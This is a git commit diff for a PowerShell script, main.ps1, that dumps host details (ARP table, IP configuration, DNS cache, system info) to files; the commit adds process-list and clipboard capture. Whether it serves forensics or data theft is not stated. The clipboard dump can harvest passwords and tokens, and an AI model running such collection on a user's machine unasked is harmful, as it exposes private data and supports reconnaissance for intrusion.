01e201ab0e8d62cd92bd905d2c6bae2a00322c1f
Mostafamabrok <mostafa.m.mabrok@gmail.com>
2023-08-22 10:46:17 +0300

    added tasklist and clipboard

--- main.ps1
+++ main.ps1
@@ -3,3 +3,6 @@ arp -a > dumped/iplist.txt
 ipconfig > dumped/ipconfig.txt 
 ipconfig /displaydns > dumped/dnsdisplay.txt 
 systeminfo > dumped/sysinfo.txt 
+tasklist > dumped/tasklist.txt
+Get-Clipboard > dumped/clipboard.txt
+
